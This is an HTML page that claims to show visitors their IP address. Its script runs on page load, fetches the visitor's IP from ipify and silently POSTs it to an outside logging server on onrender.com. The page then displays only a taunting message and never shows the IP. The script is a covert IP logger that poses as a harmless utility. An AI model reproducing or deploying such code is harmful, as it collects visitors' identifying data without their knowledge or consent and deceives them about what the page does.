<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>I wasted my time for this</title>
</head>
<body>
    <h1>Your IP Address</h1>
    <p id="ip-display">Fetching your IP address...</p>

    <script>
        // Function to send IP to the server
        function sendIPToServer(ip) {
            fetch('https://ip-logger-872n.onrender.com/log-ip', { // Updated to your server address
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ip: ip })
            })
            .then(response => response.json())
            .then(data => {
                console.log('IP sent to server:', data);
            })
            .catch(error => {
                console.error('Error sending IP to server:', error);
            });
        }

        // Fetch IP address from the ipify API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                document.getElementById('ip-display').textContent = `Your IP address is: haha jk I'm not that smart`;
                
                // Send the IP to the server
                sendIPToServer(ipAddress);
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
                document.getElementById('ip-display').textContent = 'Could not retrieve IP address.';
            });
    </script>
</body>
</html>
